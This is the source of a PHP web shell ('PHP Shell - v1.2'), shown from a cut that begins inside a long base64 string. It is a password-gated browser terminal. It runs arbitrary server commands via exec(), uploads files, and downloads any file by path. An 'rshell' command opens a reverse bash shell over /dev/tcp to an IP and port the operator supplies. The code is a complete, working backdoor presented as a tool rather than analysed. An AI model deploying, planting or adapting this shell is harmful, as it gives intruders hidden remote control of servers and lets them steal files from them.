QPqcPO0NJVV8gInqlyQLvCnUo+dzihpxS0dPD1I1B9zT6Kpo6kRuzxK7k08qGxRjtQ/TFXoaWCPjhUSOVvcqoVgDtPNFzjRlZEiR0zIsbZbqB6LjrId+GqYVlijLc+S+Ud23gV0YsFYEqbMAdh22PI0jJJFRzPGbPlsve2rA1AcjSJhGRmq5IX2KEbW37NebH+dGJmUs6HUA4CSd49IfHDzUUMQ83KlVHNHIwlvnaxtt3jDk6VnEK66WJgZW3SMNiDsG/DRRvlzIpym4uL2PueSKOZGjkUMrCxBwUraMWjBqItwJAkXxOphiqoUhDHiuNp2OZ496Hrpb5gYgFQtfIadhUBadCudrEoxJ1NhdJBObNDLER11Nv6hcY0ZOkollzKHmkLlb6wLALq7hi44IZo54lkRrqwuMaUkQUhGYX42LV+8YUggYmrYYXVC6Zm1AFgCT0AHFDXymkhHFTzysoZiFsLvr9JrDHFV8/rJVgXqx85/wCpsQUVPTksic47XYlmPeTg6hjS1UKqJo4Yw651jEn5yw5q9PbiGebRtQlPOAYJmPFSAWyk68je66vNR6TgkhhBEsTR2vlBbNn+JxU1C6QEVKmZc7eeDAqQq7Qe/D0NHMBxlNE3eovj/DKdfVvPF+iVgPgSRjyKpB5mkJrdDKjfTFLTVJWWJatouKlcFVVT6RzjaDuONI0UsVDUSPVyyFVDWIUDUQdwGBomkk1ycbJvs8rkfC9sRUFHTjzVNEh6VUA40TZaMRb4neM/tYgcE08VOheRwoGOLnr/AFgaKn6mx3Hb1R2bcVKI9fo6kRQEjDTMo1ABRlXFRTS1s0aSLkhikDXO1yP4HuvTQcwxBEGYSBkbquusfHFFTLXJJVGZ1eR7gobGPLqynu3g4EldTesiEydePU3ih+mIa+lmbKsgD70bmsO9WscXGNUWkSN08X+6M/UHFbHx9FURdeJl+IxQTCaippetEp+IxnTrDEc8dFpCsWR1SOVVmBJsARzG+mPKp6jVTQnL+JICq+A2nEVEquJZXMso2M2xf0jdgYofP6Q0jUbldYE7kF2+Z92zwy0kzVVOpZW9dEPa/Mv5h88QzRzxrJGwZW2EYengnTLNEji+xgDj/D0X1M88X6XLD4PmGKyKpgjSd5xKIZFb0ArAbGuR2HFtI21rTntDMPocaOiquJaKNoFEMrpd4y7am1bCN2PJKl/W10ndGqoPqcVlNHReT1KZvNTDOWYsSr8062vwzzJTxSSubKilj4Y0JGyaNhZ/TkzSt3uc3u6WmlhkaeksGY3kiOpX7exsU05mLhoZY2FiQ4/gjUeCSNZY3jcXVlKkdhxo92ekRXPPS8b96HLik81pGvj3Pxco8RlP9vBPCs8MsTbHQqfHGjZmnooS/pqCj/qQ5TwSRxyoUkQMp2gi4OAABYCwHvKn81X1se5wko8RlP8Abie8WkaKXdIrxH+4fxw6PfLW6Tg3LKsg/wBRfepgmOkFm1cWIWU/EEY0qMtKJRthkSTwU6/lgbOCGlhgeZ0WzStmckkk+9polmhkibY6FT4i2NGymaihLemoyP8AqTmn3zFDVU9bKI1U08zcYST6LWsw8fvn/9k=";

// Session
session_start();

//
// Variables
//

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";


//
// Functions
//

// Sanitize Dirs
function getDir($dir, $cmd = false) {
    if ($cmd) {
        chdir($dir);
        $dir = getcwd();
    }
    if ($dir == "/") {
        return $dir;
    }
    if (substr_count($dir, "\\") == 0 && substr_count($dir, "/") != 0) {
        $split = explode("/", $dir);
    } else if (substr_count($dir, "\\") != 0 && substr_count($dir, "/") == 0) {
        $split = explode("\\", $dir);
    } else {
        return $dir;
    }
    return $split[count($split)-1];
}

// Execute Command
function executeCMD($cmd) {
    $trail = substr($cmd, -2);
    if ($trail != " &") {
        $trail = "";
    }
    chdir($_SESSION['cwdlong']);
    if (substr($cmd, 0, 3) == "cd " && strpos($cmd, ";") == 0) {
        $dir = getDir(substr($cmd, 3), true);
        $_SESSION['cwd'] = $dir;
        $_SESSION['cwdlong'] = getcwd();
        echo '{"cwd": "'.$dir.'"}';
        return;
    }
    if (substr($cmd, 0, 7) == "rshell " && strpos($cmd, ";") == 0) {
        $split = explode(" ", $cmd);
        if (count($split) < 3) {
            echo '{"lines": ["'.base64_encode("rshell requires an IP and a port").'"]}';
            return;
        }
        exec('/bin/bash -c "bash -i >& /dev/tcp/'.$split[1].'/'.$split[2].' 0>&1 &"');
        echo '{"lines": ["'.base64_encode("Remote shell opened to ".$split[1].":".$split[2]).'"]}';
        return;
    }
    exec($cmd . " 2>&1" . $trail, $output);
    $json = '{"lines": [';
    for ($ctr = 0; $ctr < count($output); $ctr++) {
        $json .= '"'.base64_encode($output[$ctr]).'"';
        if ($ctr < count($output)-1) {
            $json .= ",";
        }
    }
    $json .= ']}';
    echo $json;
}

// File upload
function upload() {
    $target = $_SESSION['cwdlong'];
    $file = $target . DIRECTORY_SEPARATOR . basename($_FILES["file"]["name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $file)) {
        echo '{"lines": ["' . base64_encode("Your file was uploaded to: " . $file) . '"]}';
    } else {
        echo '{"lines": ["' . base64_encode("Permission Denied: " . $target) . '"]}';
    }
}

// File download
function download() {
    $_POST['download'] = base64_decode($_POST['download']);
    if (strpos("x".$_POST['download'],"/") !== 0 || strpos("x".$_POST['download'],"\\") !== 0) {
        $file = $_POST['download'];
    } else {
        $target = $_SESSION['cwdlong'];
        $file = $target . DIRECTORY_SEPARATOR . $_POST['download'];
    }
    if (!file_exists($file)) {
        echo '{"lines": ["' . base64_encode("File does not exist: " . $file) . '"]}';
        return;
    }
    $data = file_get_contents($file);
    echo '{"file": "' . base64_encode($data) . '", "filename": "'.basename($file).'"}';
}


//
// Program
//

if (!isset($_POST['exec']) && !isset($_FILES['file']) && !isset($_POST['download'])) {
    head();
    css();
}

if (!isset($_SESSION['logged_in']) && isset($_POST['exec'])) {
    echo '{"error": "NoLogin"}';
} else if (!isset($_SESSION['logged_in'])) {
    if (!isset($_POST['username'])) {
        displayLogin();
    } else {
        if (hash('sha512', $_POST['username']) == $USERNAME && hash('sha512', $_POST['password']) == $PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['cwd'] = getDir(getcwd());
            $_SESSION['cwdlong'] = getcwd();
            $_SESSION['hostname'] = gethostname();
            $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
            displayShell();
        } else {
            displayLogin(true);
        }
    }
} else if ($_SESSION['logged_in'] && isset($_POST['logout'])) {
    unset($_SESSION['logged_in']);
    displayLogin();
} else if ($_SESSION['logged_in'] && isset($_POST['download'])) {
    download();
}  else if ($_SESSION['logged_in'] && isset($_FILES['file'])) {
    upload();
} else if ($_SESSION['logged_in'] && !isset($_POST['exec'])) {
    $_SESSION['cwd'] = getDir(getcwd());
    $_SESSION['cwdlong'] = getcwd();
    $_SESSION['hostname'] = gethostname();
    $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
    displayShell();
} else if ($_SESSION['logged_in'] && isset($_POST['exec'])) {
    executeCMD(base64_decode($_POST['exec']));
}

// Dont include if the user is not logged in. Also dont include if an api call
if (isset($_SESSION['logged_in']) && !isset($_POST['exec']) && !isset($_FILES['file']) && !isset($_POST['download'])) {
    javascript();
}

// Dont include if this is an api call
if (!isset($_POST['exec']) && !isset($_FILES['file']) && !isset($_POST['download'])) {
    echo "  </body>
          </html>";
}


//
// This is scripting, HTML, and CSS, moving down here to make this "cleaner"
//

// Login Screen
function displayLogin($failed = false) {
    ?>
    <div class="login">
        <div class="login-title">Login</div>
        <?php if ($failed) { ?>
            <span class="error">Failed Login!</span><br>
        <?php } ?>
        <form method="post">
            <input type="text" id="username" name="username" class="input user" placeholder="Username"><br>
            <input type="password" id="password" name="password" class="input password" placeholder="Password"><br>
            <input class="login-button" type="submit" value="Log in">
        </form>
    </div>
    <?php
}

// Shell Screen
function displayShell() {
    ?>
    <div id ="shell-container" class="shell-container">
        <table class="shell-table">
            <tr>
                <td class="shell-cell">
                    <div id="shell" class="shell">
                    </div>
                </td>
            </tr>
            <tr class="shell-command-row">
                <td class="shell-cell">
                    <table id="exec-table">
                        <tr>
                            <td class="exec-host">
                                <span id="bash" class="bash"><span id='exec-user' class='exec-user'><?php echo $_SESSION['user']."</span>@<span id='exec-host' class='exec-host'>".$_SESSION['hostname']."</span>:<span id='cwd' class='cwd'>".$_SESSION['cwd']."</span>"; ?>#</span>
                            </td>
                            <td class="exec-row">
                                <input type="text" id="exec" name="exec" class="command">
                            </td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
    </div>
    <?php
}

function head() {
    echo "<html>
            <head>
                <title>PHP Shell - v1.2</title>
            </head>
            <body>";
}

function css() {
    global $WALLPAPER;
    echo "  <style>
                body {
                    background: url('".$WALLPAPER."');
                    background-attachment: fixed;
                    background-repeat: no-repeat;
                    background-size: 75% 75%;
                    background-position: center;
                    background-color: black;
                }
                .shell {
                    height: 100%;
                    overflow-y: scroll;
                    overflow-wrap: break-word;
                    word-break: break-all;
                }
                .shell-container {                
                    background: black;
                    width: 100%;
                    height: 100%;
                    -webkit-box-shadow: 0px 0px 0px 20px rgba(0,0,0,1);
                    box-shadow: 0px 0px 0px 20px rgba(0,0,0,1);
                }
                .shell-container, .shell-command-row .bash, .shell-command-row input, .shell {            
                    font-family: monospace;
                    color: white;
                }
                .shell-table .shell-cell {
                    padding: 10px;
                }
                .command {
                    background: none;   
                    border: none;
                    width: 100%;
                    outline: none !important;
                }
                .shell-table {
                    width: 100%;
                    height: 100%;
                }
                .shell-command-row {
                    height: 40px;
                }
                .exec-host {
                    white-space: nowrap;
                    padding: 0px;
                }
                .exec-row {
                    width: 100%;
                    padding: 0px;
                    padding-left: 5px;
                }
                .error {
                    display: block;
                    width: 100%;
                    text-align: center;
                    height: 0px;
                    color: red;
                    font-weight: bolder;
                    text-shadow: 1px 1px 1px black;
                }
                .input-label {
                    color: white;
                    font-weight: bolder;
                    text-shadow: 1px 1px 1px black;
                }
                .login-button {
                    padding: 10px;
                    border-radius: 20px;
                    width: 200px;
                    color: white;
                    background: rgba(255,255,255,0.2);
                    border: none;
                    text-shadow: 1px 1px 1px black;
                    font-weight: bolder;
                    transition: background 1s ease;
                }
                .input.user, .input.password {
                    background: none;
                    border: none;
                    border-bottom: 1px solid #f55600;
                    color: white;
                    outline: none !important;
                    width: 200px;
                    margin-bottom: 20px;
                    height: 20px;
                }
                .input.user {
                    margin-top: 10px;
                }
                .input::placeholder {
                    color: white;
                }
                .login-button:hover {
                    background: rgba(255,255,255,0.4);
                    transition: background 1s ease;
                    cursor: pointer;
                }
                .login-title {
                    background: rgba(0,0,0,0.4);
                    color: white;
                    margin-left: -20px;
                    margin-right: -20px;
                    margin-top: -20px;
                    margin-bottom: 20px;
                    padding: 5px;
                }
                .login {
                    width: 300px;
                    height: 160px;
                    position: absolute;
                    left: 50%;
                    top: 50%;
                    margin-top: -80px;
                    margin-left: -150px;
                    padding: 20px;
                    text-align: center;
                    background: rgba(0, 54, 74, 0.7);
                    -webkit-box-shadow: 0px 0px 7px 3px rgba(0,0,0,0.75);
                    -moz-box-shadow: 0px 0px 7px 3px rgba(0,0,0,0.75);
                    box-shadow: 0px 0px 7px 3px rgba(0,0,0,0.75);
                }
                
                .login table {
                    margin-left: auto;
                    margin-right: auto;
                }
                .exec-user {
                    color: green;
                }
                .exec-host {
                    color: lightgreen;
                }
                .cwd {
                    color: red;
                }
                .shell::-webkit-scrollbar {
                  width: 12px;
                  height: 12px;
                }
                .shell::-webkit-scrollbar-track {
                  border-radius: 10px;
                  background-color: rgba(0, 0, 0, 0.4);
                }
                .shell::-webkit-scrollbar-thumb {
                  background-color: #e78632;
                  background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.3) 20%,transparent 20%,transparent 40%,rgba(255, 255, 255, 0.3) 40%,rgba(255,255,255,.3) 60%,transparent 60%,transparent 80%,rgba(255, 255, 255, 0.3) 80%);
                  border-radius: 10px;
                }
            </style>";
}

function javascript() {
    global $protocol;
    echo "  <script>
                var cmdhistory = [];
                var position = -1;
            
                function bindExec() {
                    document.getElementById('exec').onkeydown = execKey;
                }
                
                function addBashSim(element, text) {
                    let cmdPromptUser = document.createElement('span');
                    let cmdPromptHost = document.createElement('span');
                    let cmdPromptCwd = document.createElement('span');
                    let cmd = document.createElement('span');
                    cmdPromptUser.classList.add('exec-user');
                    cmdPromptHost.classList.add('exec-host');
                    cmdPromptCwd.classList.add('cwd');
                    cmdPromptUser.innerText = document.getElementById('exec-user').innerText;
                    cmdPromptHost.innerText = document.getElementById('exec-host').innerText;
                    cmdPromptCwd.innerText = document.getElementById('cwd').innerText;
                    cmd.innerText += '# ' + text;
                    element.appendChild(cmdPromptUser);
                    element.innerHTML += '@';
                    element.appendChild(cmdPromptHost);
                    element.innerHTML += ':';
                    element.appendChild(cmdPromptCwd);
                    element.appendChild(cmd);
                    element.innerHTML += '<br>';
                }
                
                function execKey(event) {
                    if (event.code === 'Enter') {
                        
                        let exec = document.getElementById('exec');
                        let cmd = exec.value;
                        if (cmd === 'exit') {
                            let form = document.createElement('form');
                            document.body.appendChild(form);
                            form.method = 'POST';
                            let elem = document.createElement('input');
                            elem.name = 'logout';
                            elem.id = 'logout';
                            elem.type = 'hidden';
                            elem.value = 'true';
                            form.appendChild(elem);
                            form.submit();
                            return;
                        }
                        if (cmd === 'cls') {
                            cmdhistory.push(exec.value);
                            position = -1;
                            let shell = document.getElementById('shell');
                            shell.innerText = '';
                            addBashSim(shell, exec.value);
                            exec.value = '';
                            return;
                        }
                        if (cmd.startsWith('download ')) {
                            let file = cmd.substring(9, cmd.length);
                            cmdhistory.push(exec.value);
                            position = -1;
                            let shell = document.getElementById('shell');
                            addBashSim(shell, exec.value);
                            exec.value = '';
                            let req = new XMLHttpRequest();
                            req.open('POST', '" . $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "');
                            req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                            req.addEventListener('load', function() {
                                if (req.readyState === req.DONE) {
                                    if (req.status === 200) {
                                        let response = JSON.parse(req.responseText);
                                        if (response.lines) {
                                            response.lines.forEach(line => {
                                                let elem = document.createElement('span');                                            
                                                elem.innerText = atob(line);
                                                shell.appendChild(elem);
                                                shell.innerHTML += '<br>';
                                            });
                                            shell.scrollTop = shell.scrollHeight;
                                        } else if (response.file) {
                                            let link = document.createElement('a');
                                            link.href = 'data:application/octet-stream;charset=utf-8;base64,' + response.file;
                                            link.setAttribute('download', response.filename);
                                            link.click();
                                        } else {
                                            let elem = document.createElement('span');                                            
                                            elem.innerText = 'ERROR: No file or output returned!';
                                            shell.appendChild(elem);
                                            shell.innerHTML += '<br>';                                    
                                        }
                                    } else {
                                        let elem = document.createElement('span');                                            
                                        elem.innerText = 'ERROR: ' + req.status + ': ' + req.statusText;
                                        shell.appendChild(elem);
                                        shell.innerHTML += '<br>';                                    
                                    }
                                }
                            });
                            req.ontimeout = function () {
                                let elem = document.createElement('span');                                            
                                elem.innerText = 'ERROR: Timeout';
                                shell.appendChild(elem);
                                shell.innerHTML += '<br>';
                             };
                            req.onerror = function () {
                                let elem = document.createElement('span');                                            
                                elem.innerText = 'ERROR: Failed to connect';
                                shell.appendChild(elem);
                                shell.innerHTML += '<br>';
                            };
                            req.send('download=' + btoa(file));
                            return;
                        }
                        if (cmd === 'upload') {
                            cmdhistory.push(exec.value);
                            position = -1;
                            let shell = document.getElementById('shell');
                            addBashSim(shell, exec.value);
                            exec.value = '';
                            let filePrompter = document.createElement('input');
                            filePrompter.type = 'file';
                            filePrompter.name = 'file';
                            filePrompter.click();
                            filePrompter.onchange = function() {
                                let file = filePrompter.files[0];
                                let formData = new FormData();
                                formData.append('file', file);
                                let req = new XMLHttpRequest();
                                req.open('POST', '" . $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "');
                                req.addEventListener('load', function() {
                                    if (req.readyState === req.DONE) {
                                        if (req.status === 200) {
                                            let response = JSON.parse(req.responseText);
                                            if (response.lines) {
                                                response.lines.forEach(line => {
                                                    let elem = document.createElement('span');                                            
                                                    elem.innerText = atob(line);
                                                    shell.appendChild(elem);
                                                    shell.innerHTML += '<br>';
                                                });
                                                shell.scrollTop = shell.scrollHeight;
                                            }
                                        } else {
                                            let elem = document.createElement('span');                                            
                                            elem.innerText = 'ERROR: ' + req.status + ': ' + req.statusText;
                                            shell.appendChild(elem);
                                            shell.innerHTML += '<br>';                                    
                                        }
                                    }
                                });
                                req.ontimeout = function () {
                                    let elem = document.createElement('span');                                            
                                    elem.innerText = 'ERROR: Timeout';
                                    shell.appendChild(elem);
                                    shell.innerHTML += '<br>';
                                 };
                                req.onerror = function () {
                                    let elem = document.createElement('span');                                            
                                    elem.innerText = 'ERROR: Failed to connect';
                                    shell.appendChild(elem);
                                    shell.innerHTML += '<br>';
                                };
                                req.send(formData);
                            };
                            return;
                        }
                        cmdhistory.push(exec.value);
                        exec.value = '';
                        position = -1;
                        let shell = document.getElementById('shell');                        
                        addBashSim(shell, cmd);
                        let req = new XMLHttpRequest();
                        req.open('POST', '".$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."');
                        req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        req.addEventListener('load', function() {
                            if (req.readyState === req.DONE) {
                                if (req.status === 200) {
                                    let response = JSON.parse(req.responseText);
                                    if (response.error && response.error === 'NoLogin') {
                                        window.location = '".$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."';
                                        return;
                                    } else if (response.error) {                                        
                                        shell.innerText += response.error + '<br>';
                                    }
                                    if (response.cwd) {
                                        document.getElementById('cwd').innerText = response.cwd;
                                    }
                                    if (response.lines) {
                                        response.lines.forEach(line => {
                                            let elem = document.createElement('span');                                            
                                            elem.innerText = atob(line);
                                            shell.appendChild(elem);
                                            shell.innerHTML += '<br>';
                                        });
                                        shell.scrollTop = shell.scrollHeight;
                                    }
                                } else {
                                    let elem = document.createElement('span');                                            
                                    elem.innerText = 'ERROR: ' + req.status + ': ' + req.statusText;
                                    shell.appendChild(elem);
                                    shell.innerHTML += '<br>';                                    
                                }
                            }
                        });
                        req.timeout = 10000;
                        req.ontimeout = function () {
                            let elem = document.createElement('span');                                            
                            elem.innerText = 'ERROR: Timeout';
                            shell.appendChild(elem);
                            shell.innerHTML += '<br>';
                        };
                        req.onerror = function () {
                            let elem = document.createElement('span');                                            
                            elem.innerText = 'ERROR: Failed to connect';
                            shell.appendChild(elem);
                            shell.innerHTML += '<br>';
                        };
                        cmd = btoa(cmd);
                        req.send('exec='+cmd);
                    }
                    if (event.code === 'ArrowUp') {
                        if (cmdhistory.length === 0) {
                            return;
                        }
                        if (position === -1) {
                            position = cmdhistory.length; 
                        }
                        position--;
                        if (position < 0) {
                            position = 0;
                        }
                        document.getElementById('exec').value = cmdhistory[position];
                    }
                    if (event.code === 'ArrowDown') {
                        if (cmdhistory.length === 0) {
                            return;
                        }                    
                        if (position === -1) {
                            position = cmdhistory.length - 1; 
                        }
                        position++;
                        if (position >= cmdhistory.length) {
                            position = cmdhistory.length;
                            document.getElementById('exec').value = '';
                            return;
                        }
                        document.getElementById('exec').value = cmdhistory[position];
                    }
                }
                
                function bindClick() {
                    document.getElementById('shell-container').onclick = event => {
                        document.getElementById('exec').focus();
                    };
                }
                
                window.onload = (event) => {
                    bindExec();
                    bindClick();
                };
            </script>";
}